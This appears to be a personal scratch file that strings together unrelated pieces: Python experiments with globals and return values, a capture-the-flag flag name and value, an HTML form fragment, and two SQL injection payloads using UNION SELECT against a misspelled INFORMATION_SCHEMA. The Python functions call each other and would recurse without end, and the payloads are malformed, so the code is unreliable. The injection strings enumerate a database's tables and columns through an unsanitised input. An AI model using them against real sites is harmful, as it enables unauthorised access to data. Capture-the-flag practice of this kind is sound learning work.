y = 11
x = 10
""" def testingmode():
    global x,y
    if x > y :
        return True,print("x > y")
    else:
        return False,print("x < y")
print(testingmode()) """

##x < y
##(False, None)
def print_fun():
    #print("x < y")
    if testingmode() == False:
        print("return value False is given")
    if testingmode() == True:
        print("return value True is given")
    #print(a)

def testingmode():
    global x,y
    if x > y :
        return True#,print_fun()#,print("x > y")
    else:
        #return False#,print_fun()#,False
        #return False,print("x < y")
        return print_fun() #*x < y
                            #*None
        #print_fun() #? working



testingmode()
print_fun()

#print(testingmode())
#* testing line 21
#print(bool(testingmode))



Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs 

	  			<h5 class="white-text">Input:  </h5>
		  			<input type="text" name="input" id="textBox" required>
		  			<input id="submit" type="submit" value="Submit">


' UNION SELECT TABLE_NAME,COLUMN_NAME FROM INFOMATION_SCHEMA.COLUMNS #
' UNION SELECT white-text,input FROM INFOMATION_SCHEMA.COLUMNS #
